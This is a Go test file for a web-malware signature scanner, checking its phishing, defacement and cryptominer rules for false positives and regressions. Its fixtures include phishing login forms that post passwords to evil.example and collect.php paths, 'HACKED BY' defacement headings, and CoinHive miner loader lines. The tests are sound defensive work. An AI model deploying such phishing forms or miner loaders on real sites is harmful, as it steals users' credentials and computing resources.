package signatures

import "testing"

// The YAML engine scans .html/.htm/.php, so the .php false positive is the
// cookie-notice welcome.php admin page (PayPal brand + a password setting + an
// SPA form). Office 365 intentionally keeps its stronger DOM-ID detector.

func TestFPFlood_YML_RulesCompile(t *testing.T) {
	s := loadRepoScanner(t)
	if err := s.LoadError(); err != nil {
		t.Fatalf("loading repository rules: %v", err)
	}
}

func TestFPFlood_YML_PhishingPaypal_AdminPage(t *testing.T) {
	s := loadRepoScanner(t)
	adminPage := []byte("<div class=\"cn-welcome\"><a href=\"https://paypal.com/donate\">Support us via PayPal</a>\n<form method=\"post\" action=\"payment\" data-action=\"save\"><input type=\"password\" name=\"api_secret\"></form></div>")
	if hasRule(s.ScanContent(adminPage, ".php"), "phishing_paypal") {
		t.Error("phishing_paypal FP: matched a plugin admin settings page")
	}
	mal := []byte("<h2>Log in to your PayPal account</h2><form action=\"https://evil.example/collect.php\" method=\"post\"><input type=\"email\"><input type=\"password\"></form>")
	if !hasRule(s.ScanContent(mal, ".php"), "phishing_paypal") {
		t.Error("phishing_paypal regression: real PayPal phishing page not detected")
	}
}

func TestFPFlood_YML_PhishingCollectorVariants(t *testing.T) {
	s := loadRepoScanner(t)
	tests := []struct {
		name   string
		rule   string
		brand  string
		action string
	}{
		{name: "sharepoint absolute URL", rule: "phishing_sharepoint", brand: "SharePoint", action: "https://evil.example/collect"},
		{name: "sharepoint root path", rule: "phishing_sharepoint", brand: "secured by Microsoft", action: "/collect"},
		{name: "paypal relative path", rule: "phishing_paypal", brand: "PayPal", action: "./collect"},
		{name: "paypal root", rule: "phishing_paypal", brand: "PayPal", action: "/"},
		{name: "bank script query", rule: "phishing_bank_generic", brand: "online banking account number", action: "collect.php?step=1"},
		{name: "bank script path info", rule: "phishing_bank_generic", brand: "online banking account number", action: "collect.php/next"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			body := []byte(tc.brand + `<form action="` + tc.action + `" method="post"><input type="password"></form>`)
			if !hasRule(s.ScanContent(body, ".html"), tc.rule) {
				t.Errorf("%s regression: collector action %q was not detected", tc.rule, tc.action)
			}
		})
	}
}

func TestFPFlood_YML_PhishingRejectsPseudoHTMLAttributes(t *testing.T) {
	s := loadRepoScanner(t)
	rules := []struct {
		name  string
		brand string
	}{
		{name: "phishing_sharepoint", brand: "SharePoint"},
		{name: "phishing_bank_generic", brand: "online banking account number"},
		{name: "phishing_paypal", brand: "PayPal"},
	}
	for _, tc := range rules {
		t.Run(tc.name, func(t *testing.T) {
			legitimate := [][]byte{
				[]byte(tc.brand + `<form action="settings" data-action="/collect"><input type="password"></form>`),
				[]byte(tc.brand + `<form action="/collect"><div data-type="password"></div></form>`),
				[]byte(tc.brand + `<form title=" action='/collect'" action="settings"><input type="password"></form>`),
				[]byte(tc.brand + `<form action="/collect"><input title=" type='password'"></form>`),
				[]byte(tc.brand + `<form action="collect.phpx"><input type="password"></form>`),
			}
			for _, body := range legitimate {
				if hasRule(s.ScanContent(body, ".html"), tc.name) {
					t.Errorf("%s FP: pseudo collector or password attribute matched: %s", tc.name, body)
				}
			}
		})
	}
}

func TestFPFlood_YML_DefaceHackedBy_Prose(t *testing.T) {
	s := loadRepoScanner(t)
	prose := [][]byte{
		[]byte("<p>Web Application Firewall stops you from getting hacked by identifying malicious traffic.</p>"),
		[]byte("<h1>Security guidance</h1><p>Getting hacked by identifying malicious traffic can be prevented.</p>"),
		[]byte("<p>Getting hacked by identifying malicious traffic can be prevented.</p><h1>Security guidance</h1>"),
	}
	for _, body := range prose {
		if hasRule(s.ScanContent(body, ".php"), "deface_hacked_by") {
			t.Errorf("deface_hacked_by FP: matched prose outside a heading: %s", body)
		}
	}
	malicious := [][]byte{
		[]byte("<html><TITLE>HACKED BY xShadow</TITLE><H1>HACKED BY xShadow</H1></html>"),
		[]byte("<center><font color=red><b>Hacked By xShadow</b></font></center>"),
	}
	for _, body := range malicious {
		if !hasRule(s.ScanContent(body, ".html"), "deface_hacked_by") {
			t.Errorf("deface_hacked_by regression: real defacement heading not detected: %s", body)
		}
	}
}

func TestFPFlood_YML_MinerCoinhive_LoaderStructure(t *testing.T) {
	s := loadRepoScanner(t)
	legitimate := [][]byte{
		[]byte("<?php return array('bots'=>array('Googlebot','CoinHive','AhrefsBot'));"),
		[]byte("renew CoinHive membership; renew AuthedMine membership"),
	}
	for _, body := range legitimate {
		if hasRule(s.ScanContent(body, ".php"), "miner_coinhive_js") {
			t.Errorf("miner_coinhive FP: matched a bare or embedded brand mention: %s", body)
		}
	}
	malicious := [][]byte{
		[]byte("var m=new CoinHive.Anonymous('KEY'); m.start();"),
		[]byte("var m = new CoinHive({siteKey: 'KEY'}); m.start();"),
		[]byte("var m = new AuthedMine({siteKey: 'KEY'}); m.start();"),
	}
	for _, body := range malicious {
		if !hasRule(s.ScanContent(body, ".js"), "miner_coinhive_js") {
			t.Errorf("miner_coinhive regression: real miner loader not detected: %s", body)
		}
	}
}
